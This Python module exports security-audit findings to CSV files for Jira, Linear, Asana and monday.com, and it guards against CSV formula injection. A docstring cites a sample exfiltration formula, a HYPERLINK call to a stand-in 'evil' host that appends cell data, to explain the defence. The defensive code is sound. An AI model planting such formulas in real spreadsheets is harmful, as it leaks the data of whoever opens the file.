"""Write confirmed findings to CSV / Excel files that ticketing tools import.

Always writes:   security-findings.csv          (generic, opens in Excel/Sheets)
Optionally also: security-findings-jira.csv     (Jira CSV importer)
                 security-findings-linear.csv   (Linear CLI importer, "Linear" CSV)
                 security-findings-asana.csv    (Asana CSV importer)
                 security-findings-monday.csv   (monday.com import, CSV or Excel)

Formats follow each vendor's import docs (checked 2026-11):
  Jira:   only Summary is required; multiple labels = repeat the Labels column;
          ~1500 rows per file recommended.
  Linear: Title, Description, Priority, Status, Labels (comma-separated).
  Asana:  column order Name, Description, Section, Assignee; Title Case headers;
          other columns become custom fields (Premium) or go into the description.
  monday: .csv/.xlsx/.xls; you choose the item-name column and can skip rows that
          match existing items (use "Finding ID" to avoid duplicates).
"""

import csv
from pathlib import Path

TICKETING_SYSTEMS = ("none", "jira", "linear", "asana", "monday")
SEVERITY_ORDER = {"high": 0, "medium": 1, "low": 2}
JIRA_MAX_ROWS = 1500


# ---------------------------------------------------------------- safety

def safe_cell(value: object) -> str:
    """Stop CSV / formula injection (CWE-1236).

    Evidence comes from the audited code, which may be hostile. A cell starting
    with = + - @ is run as a formula by Excel, Sheets and LibreOffice, e.g.
    =HYPERLINK("http://evil/?"&A1) can leak data when someone opens the file.
    Prefixing with ' makes spreadsheets treat it as plain text.
    """
    text = "" if value is None else str(value)
    if text and text[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + text
    return text


# ---------------------------------------------------------------- content

def location(f: dict) -> str:
    return f"{f['file']}:{f['line']}" if f.get("line") else f["file"]


def title(f: dict) -> str:
    return f"[{f['severity'].capitalize()}] {f['title']}"


def description(f: dict) -> str:
    """Plain-text ticket body. Every tool accepts plain text; markup differs."""
    parts = [
        f"Finding ID: {f['id']}",
        f"Severity: {f['severity'].capitalize()}",
        f"Location: {location(f)}",
        f"Source: {f.get('source', '')}",
        "",
        f"Evidence: {f.get('evidence', '')}",
        "",
        f"Why it matters: {f.get('why', '')}",
        "",
        f"Fix: {f.get('fix', '')}",
        "",
        f"SOC 2: {', '.join(f.get('soc2') or []) or 'n/a'}",
        f"ISO 27001:2022: {', '.join(f.get('iso27001') or []) or 'n/a'}",
        "",
        "Generated by audit-evidence-kit. Full report: security-audit-report.md",
    ]
    return "\n".join(parts)


def labels(f: dict) -> list[str]:
    """Labels without spaces (Jira labels can't contain spaces)."""
    out = ["security", f"severity-{f['severity']}", f["issue_type"]]
    out += [f"soc2-{c}" for c in f.get("soc2") or []]
    out += [f"iso27001-{c.removeprefix('A.')}" for c in f.get("iso27001") or []]
    return out


# ---------------------------------------------------------------- writers

def write_csv(path: Path, header: list[str], rows: list[list], bom: bool = False) -> None:
    # utf-8-sig adds a BOM: Excel needs it to show non-English text (e.g. Hebrew)
    # correctly. Importers like Jira read the BOM as part of the first header
    # ("﻿Summary" != "Summary"), so only the generic file gets one.
    with path.open("w", newline="", encoding="utf-8-sig" if bom else "utf-8") as fh:
        writer = csv.writer(fh, quoting=csv.QUOTE_MINIMAL)  # quotes commas/newlines
        writer.writerow(header)
        writer.writerows([[safe_cell(v) for v in row] for row in rows])


def export_generic(findings: list[dict], out: Path) -> list[Path]:
    header = ["Finding ID", "Severity", "Title", "Issue Type", "Location", "Source",
              "Evidence", "Why It Matters", "Fix", "SOC 2", "ISO 27001", "Status"]
    rows = [[f["id"], f["severity"].capitalize(), f["title"], f["issue_type"], location(f),
             f.get("source", ""), f.get("evidence", ""), f.get("why", ""), f.get("fix", ""),
             ", ".join(f.get("soc2") or []), ", ".join(f.get("iso27001") or []), "Open"]
            for f in findings]
    path = out / "security-findings.csv"
    write_csv(path, header, rows, bom=True)
    return [path]


def export_jira(findings: list[dict], out: Path) -> list[Path]:
    priority = {"high": "High", "medium": "Medium", "low": "Low"}
    max_labels = max((len(labels(f)) for f in findings), default=1)
    # Jira: one "Labels" column per label, as many as the row with the most labels.
    header = ["Summary", "Issue Type", "Priority", "Description"] + ["Labels"] * max_labels
    rows = []
    for f in findings:
        lbls = labels(f)
        rows.append([title(f), "Bug", priority[f["severity"]], description(f)]
                    + lbls + [""] * (max_labels - len(lbls)))

    paths = []
    for start in range(0, max(len(rows), 1), JIRA_MAX_ROWS):  # split big audits
        suffix = "" if start == 0 else f"-part{start // JIRA_MAX_ROWS + 1}"
        path = out / f"security-findings-jira{suffix}.csv"
        write_csv(path, header, rows[start:start + JIRA_MAX_ROWS])
        paths.append(path)
    return paths


def export_linear(findings: list[dict], out: Path) -> list[Path]:
    priority = {"high": "High", "medium": "Medium", "low": "Low"}
    header = ["Title", "Description", "Priority", "Status", "Labels"]
    rows = [[title(f), description(f), priority[f["severity"]], "Todo", ",".join(labels(f))]
            for f in findings]
    path = out / "security-findings-linear.csv"
    write_csv(path, header, rows)
    return [path]


def export_asana(findings: list[dict], out: Path) -> list[Path]:
    # Asana reads the first four columns by position: Name, Description, Section, Assignee.
    # Section = severity, so the imported project has High / Medium / Low columns.
    header = ["Name", "Description", "Section", "Assignee", "Finding ID", "Severity"]
    rows = [[title(f), description(f), f["severity"].capitalize(), "", f["id"],
             f["severity"].capitalize()] for f in findings]
    path = out / "security-findings-asana.csv"
    write_csv(path, header, rows)
    return [path]


def export_monday(findings: list[dict], out: Path) -> list[Path]:
    # monday's importer accepts .csv as well as .xlsx/.xls. "Name" becomes the
    # item name; "Finding ID" is the column to match on re-import.
    header = ["Name", "Finding ID", "Severity", "Status", "Issue Type", "Location",
              "Description", "Fix", "SOC 2", "ISO 27001"]
    rows = [[title(f), f["id"], f["severity"].capitalize(), "Open", f["issue_type"],
             location(f), description(f), f.get("fix", ""),
             ", ".join(f.get("soc2") or []), ", ".join(f.get("iso27001") or [])]
            for f in findings]
    path = out / "security-findings-monday.csv"
    write_csv(path, header, rows)
    return [path]


EXPORTERS = {"jira": export_jira, "linear": export_linear,
             "asana": export_asana, "monday": export_monday}


def export(findings: list[dict], out_dir: str, ticketing: str = "none") -> list[str]:
    ticketing = ticketing.lower().strip()
    if ticketing not in TICKETING_SYSTEMS:
        raise ValueError(f"Unknown ticketing system {ticketing!r}. Use one of: {', '.join(TICKETING_SYSTEMS)}")
    out = Path(out_dir).expanduser().resolve()
    if not out.is_dir():
        raise ValueError(f"Not a folder: {out}")

    for f in findings:
        if f["severity"] not in SEVERITY_ORDER:
            raise ValueError(f"{f['id']}: severity must be high, medium or low")
    findings = sorted(findings, key=lambda f: SEVERITY_ORDER[f["severity"]])

    paths = export_generic(findings, out)
    if ticketing != "none":
        paths += EXPORTERS[ticketing](findings, out)
    return [str(p) for p in paths]
